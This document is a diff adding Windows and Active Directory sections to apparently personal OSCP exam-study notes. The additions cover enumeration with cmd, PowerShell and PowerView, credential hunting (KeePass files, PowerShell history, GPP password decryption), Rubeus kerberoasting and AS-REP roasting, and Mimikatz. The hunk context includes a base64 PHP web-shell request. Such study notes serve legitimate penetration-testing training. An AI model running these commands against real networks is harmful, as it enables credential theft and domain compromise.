@@ -163,14 +163,82 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 # Windows Foothold
 ## Enumeration
 ### cmd
+whoami
+whoami /groups - display groups of current user
+whoami /priv
+net user - get list of all local users
+net user steve - get user info for steve
+net group - all local groups
+
+### PowerView.ps1
+#May Need "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
+- Get-NetDomain
+- Get-NetUser
+- Get-NetUser | select cn (common name)
+- Get-NetUser | select cn,pwdlastset,lastlogon
+- Get-NetGroup | select cn
+- Get-NetGroup "Sales Department" | select member (get members of the Sales Department)
+- Get-NetComputer
+- Get-ObjectAcl -Identity <username>
+- Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+          - (For example, pick different items to select)
+- Convert-SidToName <SID> (like S-1-5-21-1987370470-658905705-1781884369-1103)
+- Find-LocalAdminAccess (scanning to find local admin privileges for our user)
+
+- Get-NetSession -ComputerName <name of computer>
+(The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.)
+- Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
+- Get-NetUser -SPN | select samaccountname,serviceprincipalname
+          (Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. To obtain a clear list of SPNs, we can pipe the output into select and choose the samaccountname               and serviceprincipalname attributes)
+- Find-DomainShare
+- ls \\dc1.corp.com\sysvol\corp.com\ (for example)
+- cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+          - gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+
 ### Powershell
+Get-LocalUser - get list of all local users
+Get-LocalUser steve - same as net user steve
+Get-LocalGroup - all local groups
+Get-LocalGroupMember <group name> - list of users in that group
+systeminfo - OS, version, architecture, etc
+ipconfig /all - list all netwrok interfaces
+route print - display routing table contaning all routes of the system
+netstat -ano - liust all active network connections
+  -a = all active TCP connections as well as TCP and UDP ports
+  -n = disable name resolution
+  -o = show process ID for each connection
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+  - Display 32 bit applications, remove 'select displayname' for more info
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+  -   - Display 64 bit applications, remove 'select displayname' for more info
+Get-Process - show running processes
+Get-Process <processName> | Format-List * - get all information about a process
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+  - find files with extension ".kdbx" anywhere on the system
+runas user:<username> cmd 
+  - will have to enter password after, but it gets a shell as that user
+Get-History - may not work
+(Get-PSReadlineOption).HistorySavePath
+  -Then cat or type output file and check that output for interesting files
+  - For example from 16.1.4 where we had to recreate $cred, first two lines are exact quotes:
+    - $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+    - $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+    - Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
 - Command for finding ".kdbx" files
 	- Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 - Download file from remote server
-	- iwr -uri http://\<server IP>/file.ext -outfile file.ext
+	- iwr -uri http://\<server IP>/file.ext -outfile file.ext\
+### Checking privileges on service binaries
+  - icacls (Windows utility) or  
+  - Get-ACL (PowerShell Cmdlet)
 ### winpeas.exe
+/winpeas.exe
 ## Active Directory
-
+### Rubeus usage
+          .\Rubeus.exe asreproast /nowrap
+          #Displays the vulnerable user and their AS-REP hash
+          .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+          # Displays the vulnerable user and their TGS-REP hash
 ## Privilege Escalation
 ### Mimikatz
  1. privilege::debug
@@ -420,6 +488,7 @@ For the field that says "place your shellcode here," such code can be generated 
 
 ## Buffer Overflow
 As these are my OSCP notes, and there is no longer a buffer overflow machine on the exam, I'm leaving this content out of the guide for brevity. Instead I'll link a resource which turned out to be better and more succinct than the notes I took on the subject when I went through the course. Here is [V1n1v131r4's guide on Buffer Overflows](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow). 
+
 
 
 
